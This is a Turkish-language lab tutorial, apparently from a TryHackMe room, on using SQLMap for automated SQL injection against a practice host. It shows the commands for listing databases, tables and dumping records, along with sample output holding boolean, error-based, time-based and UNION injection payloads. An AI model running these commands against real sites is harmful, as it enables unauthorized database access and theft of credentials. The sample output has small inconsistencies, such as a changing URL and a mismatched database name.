## SQLMap ile Otomatik SQL Injection

Bir **SQL injection** saldırısı gerçekleştirmek, uygulama içindeki SQL injection zafiyetini keşfetmeyi ve veritabanını manipüle etmeyi içerir. Ancak tüm bunları manuel olarak yapmak zaman ve çaba gerektirebilir.

**SQLMap**, web uygulamalarındaki SQL injection zafiyetlerini tespit etmek ve sömürmek (exploit) için kullanılan otomatik bir araçtır. Bu zafiyetleri tanımlama sürecini basitleştirir. Bu araç bazı **Linux** dağıtımlarında yerleşik olarak gelir, ancak yüklü değilse kolayca kurulabilir.

Bu bir komut satırı aracı olduğundan, kullanmak için Linux işletim sistemi terminalinizi açmanız gerekir. SQLMap ile kullanılan `--help` komutu, kullanabileceğiniz tüm bayrakları (flags) listeleyecektir. Her komuta manuel olarak bayrak eklemek istemiyorsanız, SQLMap ile `--wizard` bayrağını kullanın. Bu bayrağı kullandığınızda, araç size her adımda rehberlik edecek ve taramayı tamamlamak için sorular soracaktır; bu da yeni başlayanlar için mükemmel bir seçenektir.

### Etkileşimli Wizard (Sihirbaz)

**Terminal**

Bash

```
user@ubuntu:~$ sqlmap --wizard
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[*] starting at 08:42:50

[08:42:50] [INFO] starting wizard interface
Please enter full target URL (-u):
```

`--dbs` bayrağı, tüm veritabanı isimlerini çıkarmanıza (extract) yardımcı olur. Veritabanı isimlerini öğrendikten sonra, `-D database_name --tables` komutunu kullanarak o veritabanının tabloları hakkında bilgi alabilirsiniz. Tabloları elde ettikten sonra, o tablolardaki kayıtları enumerate etmek (listelemek) isterseniz `-D database_name -T table_name --dump` komutunu kullanabilirsiniz. SQLMap aracındaki farklı bayraklar, veritabanlarından ayrıntılı bilgi çıkarmanıza olanak tanır. Şimdi pratik bir senaryo ele alalım ve SQL injection'a karşı zafiyetli bir web uygulamasını sömürmek için yukarıdaki tüm bayrakları kullanalım.

İlk adım, olası bir zafiyetli URL veya istek (request) aramaktır. Genellikle verileri geri çağırmak için **GET parameters** kullanan bazı URL'lerle karşılaşırsınız. Örneğin, `http://sqlmaptesting.thm/search?cat=1` gibi bir URL, `1` değerini alan bir `cat` parametresi kullanır. Veri çekmek için URL'lerde GET parametreleri kullanan herhangi bir web uygulaması görürseniz, bu URL'yi SQLMap aracındaki `-u` bayrağı ile test edebilirsiniz. Bu, **HTTP GET-based testing** (HTTP GET tabanlı test) olarak kabul edilir.

Gerçek dünya senaryolarında, birçok web uygulaması kullanıcı oturumlarını sürdürmek, kimlik doğrulamasını (authentication) zorunlu kılmak veya erişim kontrollerini uygulamak için **cookies** (çerezler) kullanır. Bu tür uygulamaları test ederken, SQLMap'e sadece bir URL sağlamak yeterli olmayabilir; çünkü kimliği doğrulanmamış (unauthenticated) istekler yönlendirilebilir, reddedilebilir veya farklı içerik döndürebilir. SQLMap, `--cookie` bayrağı aracılığıyla **cookie-based testing** özelliğini destekler. Bu, `PHPSESSID`, `JSESSIONID` veya kimlik doğrulama token'ları gibi session cookie'lerini doğrudan isteğinize dahil etmenizi sağlar. Örneğin, bir tarayıcı üzerinden uygulamaya giriş yaptıktan ve session cookie'yi yakaladıktan sonra, bunu SQLMap'e `--cookie="SESSIONID=abcdef123456"` şeklinde aktararak, yalnızca kimlik doğrulamasından sonra ulaşılabilen injection noktalarını doğru bir şekilde test edebilirsiniz.

---

### SQL Injection için URL Test Etme

Gösterim için varsayılan zafiyetli bir web sitesi URL'si kullanacağız: `http://sqlmaptesting.thm`. Bu web sitesinin bir arama seçeneği olduğunu ve bir arama yaptığınızda URL'nin `http://sqlmaptesting.thm/search/cat=1` haline geldiğini varsayalım.

**Terminal**

Bash

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
[08:43:49] [INFO] testing connection to the target URL
[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[08:43:50] [INFO] target URL content is stable
[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

---
Parameter: cat (GET)
    Type: boolean-based blind
    Payload: cat=1 AND 2175=2175

    Type: error-based
    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))

    Type: AND/OR time-based blind
    Payload: cat=1 AND SLEEP(5)

    Type: UNION query
    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,...),NULL...
---
[08:45:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
```

Yukarıdaki terminal sonuçları bize hedef URL'de; **boolean-based blind**, **error-based**, **time-based blind** ve **UNION query** gibi farklı SQL injection türlerinin tanımlandığını göstermektedir. Örneğin, **boolean-based blind SQL injection** yönteminde SQL sorgusu değiştirilir ve bilgileri çıkarmak için sorguya her zaman doğru olan bir boolean ifadesi (örn. `1=1`) dahil edilir. **Error-based SQL injection** yönteminde ise veritabanı tarafından gönderilen sonuçlarda hatalar oluşturmak için bazı sorgular kasıtlı olarak değiştirilir; bu hatalar genellikle veriler hakkında değerli bilgiler içerir.

---

### Veri Çıkarma Adımları

Veritabanlarını çekmek için `--dbs` bayrağını kullanırız:

**Veritabanı İsimlerini Çıkarma** `user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs`

Plaintext

```
[08:49:01] [INFO] fetching database names
available databases [2]:
[*] users
[*] members
```

İki veritabanı ismi elde ettik. `users` veritabanını seçelim ve içindeki tabloları çekelim. Veritabanını `-D` bayrağından sonra tanımlayacağız ve tablo isimlerini çıkarmak için sonuna `--tables` bayrağını ekleyeceğiz:

**Tabloları Çıkarma** `user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables`

Plaintext

```
Database: acuart
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |     
+-----------+
```

Artık tablo isimlerine sahip olduğumuza göre, `thomas` tablosundaki kayıtları dökebiliriz (**dump**). Bunun için veritabanını `-D`, tabloyu `-T` ve kayıtları çıkarmak için `--dump` bayrağını kullanacağız:

**Tablo Kayıtlarını Çıkarma** `user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump`

Plaintext

```
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |    
+---------------------+------------+----------
| 09/09/2024          | Thomas THM | testing |    
+---------------------+------------+---------+
```

---

### POST Tabanlı Test

Yukarıdaki test URL'sinin aksine, uygulamanın verileri URL yerine isteğin gövdesinde (**body**) gönderdiği **POST-based testing** yöntemini de kullanabilirsiniz. Giriş formları ve kayıt formları buna örnektir. Bu yaklaşımı takip etmek için, giriş sayfasındaki bir POST isteğini durdurmalı (**intercept**) ve bir metin dosyası olarak kaydetmelisiniz:

**Durdurulan Bir İsteği Test Etme** `user@ubuntu:~$ sqlmap -r intercepted_request.txt`

> [!NOTE] **Not:** POST isteklerini nasıl durduracağınızı ve yakalayacağınızı öğrenmek bu odanın kapsamı dışındadır.